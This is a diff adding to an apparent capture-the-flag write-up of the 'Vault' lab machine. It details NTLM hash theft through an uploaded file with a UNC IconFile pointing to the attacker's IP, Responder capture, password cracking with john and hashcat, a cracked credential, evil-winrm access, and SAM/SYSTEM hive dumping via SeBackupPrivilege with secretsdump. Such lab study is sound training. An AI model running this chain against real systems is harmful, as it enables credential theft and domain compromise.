@@ -133,6 +133,137 @@ SMB         vault.pgp       445    DC               SYSVOL                      
 ```
 Bingo!
 
-ntlm_theft ? 
-python3 ~/GitHub/ntlm_theft/ntlm_theft.py --generate all --server 10.10.14.245 --filename flight
-go with dsypher
+lets generate some files for upload
+
+```bash
+python3 ntlm_theft.py -g all -s 192.168.45.236 --filename odin
+```
+
+it gave us plenty of files: 
+
+![alt text](image.png)
+
+but we can always use:
+```brash
+file created:
+
+Random_nonsense
+WorkingDirectory=Flibertygibbit
+IconFile=\\192.168.45.236\%USERNAME%.icon
+IconIndex=1
+```
+
+Now lets connect:
+```bash
+impacket-smbclient quest@vault.pgp 
+```
+![alt text](image-1.png)
+
+Once uploaded we need to start responder:
+```bash
+sudo responder -I tun0 -wv 
+```
+
+And bum! we have this:
+
+![alt text](image-2.png)
+
+We can use john or hashcat:
+```bash
+hashcat -m 5600 anirudh.hash /usr/share/wordlists/rockyou.txt --force --potfile-disable
+
+john  -w="/usr/share/wordlists/rockyou.txt" anirudh.hash 
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+SecureHM         (anirudh)     
+1g 0:00:00:03 DONE (2025-10-11 19:06) 0.2994g/s 3176Kp/s 3176Kc/s 3176KC/s Seifer@14..Schsutar90
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
+```
+
+We have creds!
+```bash
+anirudh:SecureHM
+```
+
+We have plenty of options:
+
+# SMB
+```bash
+crackmapexec smb vault.pgp -u 'anirudh' -p 'SecureHM' --shares 
+SMB         vault.pgp       445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:vault.offsec) (signing:True) (SMBv1:False)
+SMB         vault.pgp       445    DC               [+] vault.offsec\anirudh:SecureHM 
+SMB         vault.pgp       445    DC               [+] Enumerated shares
+SMB         vault.pgp       445    DC               Share           Permissions     Remark
+SMB         vault.pgp       445    DC               -----           -----------     ------
+SMB         vault.pgp       445    DC               ADMIN$          READ            Remote Admin
+SMB         vault.pgp       445    DC               C$              READ,WRITE      Default share
+SMB         vault.pgp       445    DC               DocumentsShare                  
+SMB         vault.pgp       445    DC               IPC$            READ            Remote IPC
+SMB         vault.pgp       445    DC               NETLOGON        READ            Logon server share 
+SMB         vault.pgp       445    DC               SYSVOL          READ            Logon server share 
+```
+
+We have port 5985 so we can use EvilWinRM and 3389 so we can use RDP.
+RDP failed
+![alt text](image-3.png)
+
+Lets check EvilWinRM
+
+![alt text](image-4.png)
+
+Lets connect via EvilWinRM and check our /priv
+```bash
+evil-winrm -i vault.pgp -u anirudh -p "SecureHM"
+```
+
+![alt text](image-5.png)
+
+We can do plenty of things, but I would like to use SeBackupPrivilege.
+
+Create files with:
+```bash
+reg save hklm\sam sam
+reg save hklm\system system
+```
+FYI. Remember to do it in folder where we cancreate files.
+![alt text](image-6.png)
+
+Download files:
+```bash
+download sam
+download system
+```
+
+Once everything is in place, one last step to get admin hash:
+```bash
+impacket-secretsdump -system system -sam sam local
+```
+
+Bum!
+![alt text](image-7.png)
+
+But my heart is broken:
+![alt text](image-8.png)
+
+We go back to anirudh and check:
+```
+net localgroup 'Remote Desktop Users'
+
+net localgroup 'Remote Management Users'
+```
+
+![alt text](image-9.png)
+
+All clear, only Anirudh has remote access.
+
+Lets go with winpeas:
+```bash
+cp /usr/share/peass/winpeas/winPEASany.exe winpeasany.exe
+```
+
+![alt text](image-10.png)
+
